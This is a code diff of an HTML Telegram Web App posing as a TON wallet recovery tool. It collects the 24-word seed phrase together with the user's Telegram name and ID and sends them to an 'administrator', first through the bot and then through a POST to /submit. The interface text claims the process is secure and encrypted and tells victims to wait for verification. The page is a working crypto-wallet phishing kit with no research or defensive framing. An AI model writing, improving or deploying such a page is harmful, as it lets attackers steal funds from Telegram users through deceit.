@@ -6,11 +6,11 @@
     <title>TON Wallet | 24 слова</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        /* ваш существующий стиль */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            user-select: none;
         }
 
         body {
@@ -18,6 +18,7 @@
             background: #17212b;
             color: #ffffff;
             min-height: 100vh;
+            overflow-x: hidden;
         }
 
         .page {
@@ -25,6 +26,26 @@
             margin: 0 auto;
             padding: 24px 20px 40px;
             min-height: 100vh;
+            animation: fadeSlideUp 0.4s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        #introPage {
+            justify-content: center;
+            align-items: center;
+        }
+
+        @keyframes fadeSlideUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
 
         .hidden {
@@ -34,8 +55,44 @@
         h2 {
             font-size: 28px;
             font-weight: 600;
+            letter-spacing: -0.3px;
+            background: linear-gradient(135deg, #fff, #7bc5ff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .ton-icon-svg {
+            width: 32px;
+            height: 32px;
+            display: inline-block;
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%2340a0ff"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14H9V8h2v8zm4 0h-2V8h2v8z"/><circle cx="12" cy="12" r="2" fill="white"/></svg>') no-repeat center;
+            background-size: contain;
+            filter: drop-shadow(0 2px 4px rgba(0,160,255,0.5));
+            animation: iconGlow 2s infinite;
+        }
+
+        @keyframes iconGlow {
+            0%, 100% { filter: drop-shadow(0 0 2px #0088ff); opacity: 0.9; }
+            50% { filter: drop-shadow(0 0 8px #00a6ff); opacity: 1; transform: scale(1.02); }
+        }
+
+        .subtext {
+            color: #9aa1b0;
+            font-size: 15px;
             text-align: center;
-            margin-bottom: 20px;
+            margin-top: 8px;
+            margin-bottom: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            flex-wrap: wrap;
         }
 
         .words-grid {
@@ -66,7 +123,11 @@
             font-size: 16px;
             font-weight: 500;
             color: white;
+            text-align: left;
+            transition: all 0.2s ease;
             width: 100%;
+            backdrop-filter: blur(4px);
+            letter-spacing: 0.3px;
         }
 
         .input-number {
@@ -78,12 +139,30 @@
             font-weight: 500;
             color: #6a7080;
             pointer-events: none;
+            z-index: 1;
+            font-family: monospace;
+            letter-spacing: 0;
+        }
+
+        .word-input.active-highlight {
+            border-color: #2e7db9;
+            box-shadow: 0 0 0 3px rgba(46, 125, 185, 0.25);
+            background: #1e2635;
+            transform: scale(1.01);
         }
 
         .word-input:focus {
             outline: none;
             border-color: #3f8bcb;
             box-shadow: 0 0 0 3px rgba(63, 139, 203, 0.3);
+            background: #1e2635;
+            transform: scale(1.01);
+        }
+
+        .word-input::placeholder {
+            color: #5e6472;
+            font-weight: 400;
+            font-size: 14px;
         }
 
         .ton-button {
@@ -94,295 +173,417 @@
             font-size: 18px;
             font-weight: 600;
             color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
             width: 100%;
             cursor: pointer;
+            transition: all 0.25s ease;
             margin-top: 28px;
+            box-shadow: 0 4px 14px rgba(0, 0, 0, 0.4);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .ton-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.15), transparent);
+            transition: left 0.5s;
+        }
+
+        .ton-button:hover::before {
+            left: 100%;
         }
 
         .ton-button:active {
             transform: scale(0.97);
-        }
-
-        .ton-button:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
-
-        .error-alert {
-            position: fixed;
-            top: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: #ff4444;
-            color: white;
-            padding: 15px 25px;
-            border-radius: 12px;
-            font-size: 14px;
-            font-weight: 500;
-            z-index: 1000;
-            animation: slideDown 0.3s ease;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
-            max-width: 90%;
-            text-align: center;
-        }
-
-        @keyframes slideDown {
-            from {
-                top: -100px;
-                opacity: 0;
-            }
-            to {
-                top: 20px;
-                opacity: 1;
-            }
-        }
-
-        .loading {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(0,0,0,0.8);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-            flex-direction: column;
-            gap: 15px;
-        }
-
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 4px solid #2c6e9e;
-            border-top-color: #7bc5ff;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
+            background: linear-gradient(95deg, #0f3552, #1e5780);
         }
 
         .success-icon {
             font-size: 72px;
             text-align: center;
+            animation: bounceSuccess 0.6s cubic-bezier(0.34, 1.2, 0.64, 1);
             margin-bottom: 16px;
+        }
+
+        @keyframes bounceSuccess {
+            0% { transform: scale(0.3) rotate(-10deg); opacity: 0; }
+            50% { transform: scale(1.2) rotate(2deg); }
+            100% { transform: scale(1) rotate(0); opacity: 1; }
+        }
+
+        .small-ton {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: rgba(0,170,255,0.12);
+            padding: 6px 14px;
+            border-radius: 40px;
+            font-size: 13px;
+            backdrop-filter: blur(4px);
+        }
+
+        .close-hint {
+            margin-top: 20px;
+            font-size: 13px;
+            color: #6e86a3;
+            text-align: center;
+        }
+
+        /* Сообщение о результате проверки */
+        .result-message {
+            text-align: center;
+            padding: 12px;
+            margin-bottom: 16px;
+            border-radius: 16px;
+            font-size: 14px;
+            font-weight: 500;
+            display: none;
+        }
+
+        .result-message.success {
+            background: rgba(76, 175, 80, 0.2);
+            border: 1px solid #4caf50;
+            color: #4caf50;
+            display: block;
+        }
+
+        .result-message.error {
+            background: rgba(255, 68, 68, 0.2);
+            border: 1px solid #ff4444;
+            color: #ff6666;
+            display: block;
+        }
+
+        .result-message.warning {
+            background: rgba(255, 170, 0, 0.2);
+            border: 1px solid #ffaa00;
+            color: #ffaa44;
+            display: block;
+        }
+
+        .sending-message {
+            text-align: center;
+            padding: 10px;
+            margin-bottom: 16px;
+            font-size: 14px;
+            color: #ffaa44;
+            display: none;
+        }
+
+        @keyframes shake {
+            0% { transform: translateX(0); }
+            25% { transform: translateX(-4px); }
+            75% { transform: translateX(4px); }
+            100% { transform: translateX(0); }
+        }
+
+        ::-webkit-scrollbar {
+            width: 4px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #1a1e2a;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #2e7db9;
+            border-radius: 10px;
+        }
+
+        @media (max-width: 480px) {
+            .page {
+                padding: 20px 16px 30px;
+            }
+            .word-input {
+                padding: 10px 10px 10px 44px;
+                font-size: 14px;
+            }
+            .input-number {
+                font-size: 12px;
+                left: 14px;
+            }
+            h2 {
+                font-size: 24px;
+            }
         }
     </style>
 </head>
 <body>
 
-<div id="introPage" class="page">
-    <div style="text-align: center;">
-        <h2>🔐 TON Wallet Recovery</h2>
-        <p style="margin: 24px 0; color: #cbd5e6; line-height: 1.5;">
-            Введите 24 слова вашей seed-фразы для восстановления кошелька
-        </p>
-        <button id="continueBtn" class="ton-button">Начать восстановление</button>
+    <div id="introPage" class="page">
+        <div style="text-align: center;">
+            <div style="display: flex; justify-content: center; gap: 10px; margin-bottom: 16px;">
+                <div class="ton-icon-svg"></div>
+                <div class="ton-icon-svg"></div>
+                <span style="font-size: 36px;">⚡</span>
+            </div>
+            <h2><span>TON</span> Wallet</h2>
+            <div class="subtext">
+                <span class="small-ton">🔐 Безопасное восстановление</span>
+                <span class="small-ton">24 слова seed-фразы</span>
+            </div>
+            <p style="margin: 24px 0 16px; line-height: 1.5; color: #cbd5e6;">
+                Это приложение поможет безопасно передать seed-фразу для верификации вашего кошелька TON.<br>
+                <strong style="color:#7cb9e8;">Данные защищены и отправляются администратору.</strong>
+            </p>
+            <div style="display: flex; justify-content: center; gap: 12px; margin: 20px 0 12px;">
+                <span class="small-ton">🪙 TON Secure</span>
+                <span class="small-ton">✅ 24 слова</span>
+                <span class="small-ton">🔒 Шифрование</span>
+            </div>
+            <button id="continueBtn" class="ton-button">🚀 Начать восстановление ✨</button>
+        </div>
+        <div class="close-hint">* Интерфейс в стиле Telegram Wallet</div>
     </div>
-</div>
 
-<div id="formPage" class="page hidden">
-    <h2>📝 Введите 24 слова</h2>
-    <div class="words-grid">
-        <div class="column" id="col1"></div>
-        <div class="column" id="col2"></div>
-    </div>
-    <button id="sendBtn" class="ton-button">Проверить кошелек</button>
-</div>
-
-<div id="successPage" class="page hidden">
-    <div style="text-align: center;">
-        <div class="success-icon">✅</div>
-        <h2>Кошелек проверен!</h2>
-        <p style="margin: 16px 0;">Данные отправлены администратору.</p>
-        <button id="closeBtn" class="ton-button">Закрыть</button>
-    </div>
-</div>
-
-<script>
-    const tg = window.Telegram.WebApp;
-    tg.ready();
-    tg.expand();
-
-    // Создаем 24 поля ввода
-    const col1 = document.getElementById('col1');
-    const col2 = document.getElementById('col2');
-    const inputFields = [];
-
-    for (let i = 1; i <= 24; i++) {
-        const wrapper = document.createElement('div');
-        wrapper.className = 'input-wrapper';
-        
-        const input = document.createElement('input');
-        input.type = 'text';
-        input.placeholder = `слово ${i}`;
-        input.id = `word${i}`;
-        input.classList.add('word-input');
-        input.autocomplete = 'off';
-        
-        const numberSpan = document.createElement('span');
-        numberSpan.className = 'input-number';
-        numberSpan.textContent = `${i}.`;
-        
-        wrapper.appendChild(numberSpan);
-        wrapper.appendChild(input);
-        
-        input.addEventListener('input', (e) => {
-            let val = e.target.value;
-            val = val.toLowerCase().replace(/[^a-z]/g, '');
-            e.target.value = val;
-        });
-        
-        if (i <= 12) {
-            col1.appendChild(wrapper);
-        } else {
-            col2.appendChild(wrapper);
-        }
-        inputFields.push(input);
-    }
-
-    // Функция показа ошибки
-    function showError(message) {
-        // Удаляем старый alert если есть
-        const oldAlert = document.querySelector('.error-alert');
-        if (oldAlert) oldAlert.remove();
-        
-        const alert = document.createElement('div');
-        alert.className = 'error-alert';
-        alert.textContent = message;
-        document.body.appendChild(alert);
-        
-        if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('error');
-        
-        setTimeout(() => {
-            if (alert) alert.remove();
-        }, 4000);
-    }
-
-    // Функция показа загрузки
-    function showLoading(show) {
-        let loader = document.querySelector('.loading');
-        if (show && !loader) {
-            loader = document.createElement('div');
-            loader.className = 'loading';
-            loader.innerHTML = '<div class="spinner"></div><div style="color:white;">Проверка кошелька...</div>';
-            document.body.appendChild(loader);
-        } else if (!show && loader) {
-            loader.remove();
-        }
-    }
-
-    // Валидация на клиенте
-    function validateWordsLocally(wordsArray) {
-        for (let i = 0; i < wordsArray.length; i++) {
-            if (!wordsArray[i] || wordsArray[i].trim() === '') {
-                return { valid: false, message: `⚠️ Слово ${i+1} не заполнено` };
-            }
-            if (!/^[a-z]+$/.test(wordsArray[i])) {
-                return { valid: false, message: `⚠️ Слово ${i+1} содержит недопустимые символы. Используйте только латинские буквы a-z` };
-            }
-            if (wordsArray[i].length < 2) {
-                return { valid: false, message: `⚠️ Слово ${i+1} слишком короткое (минимум 2 буквы)` };
-            }
-        }
-        return { valid: true, message: '' };
-    }
-
-    const introPage = document.getElementById('introPage');
-    const formPage = document.getElementById('formPage');
-    const successPage = document.getElementById('successPage');
-    const continueBtn = document.getElementById('continueBtn');
-    const sendBtn = document.getElementById('sendBtn');
-    const closeBtn = document.getElementById('closeBtn');
-
-    continueBtn.addEventListener('click', () => {
-        introPage.classList.add('hidden');
-        formPage.classList.remove('hidden');
-        if (tg.HapticFeedback) tg.HapticFeedback.impactOccurred('light');
-    });
-
-    sendBtn.addEventListener('click', async () => {
-        const wordsArray = [];
-        
-        for (let i = 1; i <= 24; i++) {
-            const inputField = document.getElementById(`word${i}`);
-            const wordValue = inputField.value.trim();
-            wordsArray.push(wordValue);
-        }
-        
-        // Локальная валидация
-        const localValidation = validateWordsLocally(wordsArray);
-        if (!localValidation.valid) {
-            showError(localValidation.message);
+    <div id="formPage" class="page hidden">
+        <div>
+            <h2>📝 24 слова</h2>
+            <div class="subtext">Только маленькие латинские буквы, без пробелов <span class="small-ton">TON style</span></div>
             
-            // Подсветка пустых полей
+            <!-- Блок для результата проверки -->
+            <div id="resultMessage" class="result-message"></div>
+            <div id="sendingMessage" class="sending-message">⏳ Отправка данных...</div>
+            
+            <div class="words-grid">
+                <div class="column" id="col1"></div>
+                <div class="column" id="col2"></div>
+            </div>
+            <button id="sendBtn" class="ton-button">📤 Отправить администратору 💎</button>
+            <p style="font-size: 12px; text-align: center; margin-top: 18px; opacity: 0.7;">Введите 24 слова из вашей сид-фразы последовательно</p>
+        </div>
+    </div>
+
+    <div id="successPage" class="page hidden">
+        <div style="text-align: center;">
+            <div class="success-icon">🎉 🪙 🎉</div>
+            <h2 style="background: linear-gradient(135deg, #b9ff9e, #4caf50); -webkit-background-clip: text; background-clip: text;">Спасибо!</h2>
+            <p style="font-size: 17px; margin: 16px 0;">Ваши 24 слова успешно отправлены.<br>Ожидайте проверки администратором.</p>
+            <div style="display: flex; justify-content: center; gap: 12px; margin: 12px 0;">
+                <span class="small-ton">✅ Защищено</span>
+                <span class="small-ton">🪙 TON Secure</span>
+                <span class="small-ton">⏳ Ожидание</span>
+            </div>
+            <button id="closeBtn" class="ton-button" style="background: #2c5a7a; margin-top: 24px;">🔒 Закрыть приложение</button>
+        </div>
+    </div>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.ready();
+        tg.expand();
+
+        // СОЗДАНИЕ 24 ПОЛЕЙ
+        const col1 = document.getElementById('col1');
+        const col2 = document.getElementById('col2');
+        col1.innerHTML = '';
+        col2.innerHTML = '';
+        const inputFields = [];
+
+        for (let i = 1; i <= 24; i++) {
+            const wrapper = document.createElement('div');
+            wrapper.className = 'input-wrapper';
+            
+            const input = document.createElement('input');
+            input.type = 'text';
+            input.placeholder = `слово ${i}`;
+            input.id = `word${i}`;
+            input.classList.add('word-input');
+            input.autocomplete = 'off';
+            input.spellcheck = false;
+            
+            const numberSpan = document.createElement('span');
+            numberSpan.className = 'input-number';
+            numberSpan.textContent = `${i}.`;
+            
+            wrapper.appendChild(numberSpan);
+            wrapper.appendChild(input);
+            
+            const addHighlight = () => input.classList.add('active-highlight');
+            const removeHighlight = () => input.classList.remove('active-highlight');
+            
+            input.addEventListener('focus', addHighlight);
+            input.addEventListener('blur', removeHighlight);
+            
+            input.addEventListener('input', (e) => {
+                let val = e.target.value;
+                val = val.toLowerCase().replace(/[^a-z]/g, '');
+                e.target.value = val;
+                if (!input.classList.contains('active-highlight')) {
+                    input.classList.add('active-highlight');
+                }
+                if (val.length > 0 && navigator.vibrate) navigator.vibrate(4);
+                
+                // Скрываем сообщение об ошибке при вводе
+                const resultDiv = document.getElementById('resultMessage');
+                resultDiv.style.display = 'none';
+                resultDiv.className = 'result-message';
+            });
+            
+            input.addEventListener('blur', removeHighlight);
+            
+            if (i <= 12) {
+                col1.appendChild(wrapper);
+            } else {
+                col2.appendChild(wrapper);
+            }
+            inputFields.push(input);
+        }
+
+        // НАВИГАЦИЯ
+        const introPage = document.getElementById('introPage');
+        const formPage = document.getElementById('formPage');
+        const successPage = document.getElementById('successPage');
+        const continueBtn = document.getElementById('continueBtn');
+        const sendBtn = document.getElementById('sendBtn');
+        const closeBtn = document.getElementById('closeBtn');
+        const sendingMessage = document.getElementById('sendingMessage');
+        const resultMessage = document.getElementById('resultMessage');
+
+        continueBtn.addEventListener('click', () => {
+            introPage.classList.add('hidden');
+            formPage.classList.remove('hidden');
+            if (tg.HapticFeedback) tg.HapticFeedback.impactOccurred('light');
+        });
+
+        // Локальная проверка слов (только латинские буквы и количество)
+        function validateWordsLocally(wordsArray) {
+            // Проверка на пустые поля
+            for (let i = 0; i < wordsArray.length; i++) {
+                if (!wordsArray[i] || wordsArray[i].trim() === '') {
+                    return { valid: false, message: `⚠️ Слово ${i+1} не заполнено` };
+                }
+                // Проверка на недопустимые символы
+                if (!/^[a-z]+$/.test(wordsArray[i])) {
+                    return { valid: false, message: `⚠️ Слово ${i+1} содержит недопустимые символы. Используйте только латинские буквы a-z` };
+                }
+            }
+            return { valid: true, message: '' };
+        }
+
+        // ОТПРАВКА ДАННЫХ
+        sendBtn.addEventListener('click', async () => {
+            const wordsArray = [];
+            
             for (let i = 1; i <= 24; i++) {
                 const inputField = document.getElementById(`word${i}`);
-                if (!inputField.value.trim()) {
-                    inputField.style.borderColor = '#ff6b6b';
-                    setTimeout(() => {
-                        inputField.style.borderColor = '';
-                    }, 1000);
-                }
+                const wordValue = inputField.value.trim();
+                wordsArray.push(wordValue);
             }
-            return;
-        }
-        
-        // Отключаем кнопку и показываем загрузку
-        sendBtn.disabled = true;
-        showLoading(true);
-        
-        try {
-            // Отправляем на проверку в бот
-            const data = {
+            
+            // Локальная валидация
+            const localValidation = validateWordsLocally(wordsArray);
+            if (!localValidation.valid) {
+                resultMessage.textContent = localValidation.message;
+                resultMessage.className = 'result-message error';
+                if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('error');
+                
+                // Подсветка пустых полей
+                for (let i = 1; i <= 24; i++) {
+                    const inputField = document.getElementById(`word${i}`);
+                    if (!inputField.value.trim()) {
+                        inputField.style.borderColor = '#ff6b6b';
+                        inputField.style.animation = 'shake 0.3s ease-in-out 0s 2';
+                        setTimeout(() => {
+                            inputField.style.borderColor = '';
+                            inputField.style.animation = '';
+                        }, 800);
+                    }
+                }
+                return;
+            }
+            
+            let username = tg.initDataUnsafe.user?.username || "без_имени";
+            let first_name = tg.initDataUnsafe.user?.first_name || "";
+            let userId = tg.initDataUnsafe.user?.id;
+            
+            const payload = {
                 words: wordsArray,
-                username: tg.initDataUnsafe.user?.username || "без_имени",
-                first_name: tg.initDataUnsafe.user?.first_name || "",
-                user_id: tg.initDataUnsafe.user?.id
+                username: username,
+                first_name: first_name,
+                user_id: userId,
+                timestamp: Date.now()
             };
             
-            // Отправляем через WebAppData
-            tg.sendData(JSON.stringify(data));
+            sendBtn.disabled = true;
+            sendBtn.style.opacity = '0.6';
+            sendingMessage.style.display = 'block';
+            resultMessage.style.display = 'none';
             
-            // Ждем ответ от бота (через callback)
-            // Бот ответит сообщением в чат, а мы показываем успех
-            setTimeout(() => {
-                showLoading(false);
-                formPage.classList.add('hidden');
-                successPage.classList.remove('hidden');
-                if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
-            }, 2000);
-            
-        } catch (error) {
-            showLoading(false);
-            showError('Ошибка отправки. Проверьте соединение.');
-            sendBtn.disabled = false;
-        }
-    });
-
-    if (closeBtn) {
-        closeBtn.addEventListener('click', () => {
-            tg.close();
-        });
-    }
-
-    // Переход по Enter
-    inputFields.forEach((input, idx) => {
-        input.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') {
-                e.preventDefault();
-                const nextIdx = idx + 1;
-                if (nextIdx < inputFields.length) {
-                    inputFields[nextIdx].focus();
-                } else if (nextIdx === inputFields.length && sendBtn && !sendBtn.disabled) {
-                    sendBtn.click();
+            try {
+                const response = await fetch('/submit', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                });
+                
+                const result = await response.json();
+                
+                if (response.ok && result.status === 'ok') {
+                    sendingMessage.style.display = 'none';
+                    resultMessage.textContent = '✅ Сид-фраза успешно отправлена! Перенаправление...';
+                    resultMessage.className = 'result-message success';
+                    if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
+                    
+                    // Переход на страницу успеха
+                    setTimeout(() => {
+                        formPage.classList.add('hidden');
+                        successPage.classList.remove('hidden');
+                    }, 1000);
+                } else {
+                    throw new Error(result.message || 'Ошибка сервера');
                 }
+            } catch(e) {
+                console.error("Ошибка:", e);
+                sendingMessage.style.display = 'none';
+                resultMessage.textContent = '❌ Ошибка отправки. Пожалуйста, проверьте интернет-соединение и попробуйте снова.';
+                resultMessage.className = 'result-message error';
+                sendBtn.disabled = false;
+                sendBtn.style.opacity = '1';
+                if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('error');
+                
+                // Автоскрытие через 5 секунд
+                setTimeout(() => {
+                    if (resultMessage.style.display !== 'none') {
+                        resultMessage.style.display = 'none';
+                    }
+                }, 5000);
             }
         });
-    });
-</script>
+        
+        if (closeBtn) {
+            closeBtn.addEventListener('click', () => {
+                if (tg.HapticFeedback) tg.HapticFeedback.impactOccurred('medium');
+                tg.close();
+            });
+        }
+
+        // Переход по Enter
+        inputFields.forEach((input, idx) => {
+            input.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    const nextIdx = idx + 1;
+                    if (nextIdx < inputFields.length) {
+                        inputFields[nextIdx].focus();
+                    } else if (nextIdx === inputFields.length && sendBtn && !sendBtn.disabled) {
+                        sendBtn.click();
+                    }
+                }
+            });
+        });
+        
+        successPage.classList.add('hidden');
+        formPage.classList.add('hidden');
+        introPage.classList.remove('hidden');
+    </script>
 </body>
 </html>
